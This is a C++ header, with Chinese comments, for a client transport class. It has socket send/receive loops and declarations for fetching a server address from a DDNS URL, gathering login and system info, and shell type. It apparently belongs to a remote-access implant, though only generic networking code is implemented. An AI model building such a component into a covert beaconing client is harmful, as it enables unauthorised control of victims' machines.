// MyTrans.h: interface for the CMyTrans class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYTRANS_H__B3652F04_7623_4FAB_9914_4B5207B6B8D5__INCLUDED_)
#define AFX_MYTRANS_H__B3652F04_7623_4FAB_9914_4B5207B6B8D5__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

char GetVideoInfo();

class CMyClientTran
{
public:
	CMyClientTran();
	virtual ~CMyClientTran();

private:
	SOCKET			m_Socket;
	BOOL			m_IsProxy;
	TCHAR			m_Addr[MAX_PATH];
	DWORD			m_Port;

public:

	//发送数据
	BOOL SendData(LPVOID data, DWORD len)
	{
		char* p = (char*) data;
		DWORD i = 0;
		int k = (int) len;
		int ret = 0;
		
		if(m_Socket == NULL)
		{
			return FALSE;
		}

		while(i < len)
		{
			ret = send(m_Socket, p, k, 0);
			if(ret <= 0)
			{
				return FALSE;
			}

			i += ret;
			p += ret;
			k -= ret;
		}
		return TRUE;
	}

	//接收数据
	BOOL RecvData(LPVOID data, DWORD len)
	{
		char* p = (char*) data;
		DWORD i = 0;
		int k = (int) len;
		int ret = 0;

		if(m_Socket == NULL)
		{
			return FALSE;
		}

		while(i < len)
		{
			ret = recv(m_Socket, p, k, 0);
			if(ret <= 0)
			{
				return FALSE;
			}

			i += ret;
			p += ret;
			k -= ret;
		}
		return TRUE;
	}

	Type static IsShellSysType();
	BOOL Create(DWORD nCmd, HWND hWnd);
	void Close();
	int CPU_Frequency(void);		
	BOOL GetRealServerInfo(LPCTSTR m_DdnsUrl);
	BOOL SendDataWithCmd(LPVOID pSendData, DWORD dSendLen, DWORD nCmd);
	BOOL RecvDataWithCmd(LPBYTE* pRecvData, DWORD* dCmd, DWORD* dRecvLen);
	
	SOCKET GetSafeSocket();

private:
	
	SOCKET GetConnectSocket(LPCTSTR pServerAddr, UINT nServerPort);
	void FillMySysInfo(LPLOGININFO pSysInfo, LPPSDLLINFO pInfo);
};

#endif // !defined(AFX_MYTRANS_H__B3652F04_7623_4FAB_9914_4B5207B6B8D5__INCLUDED_)
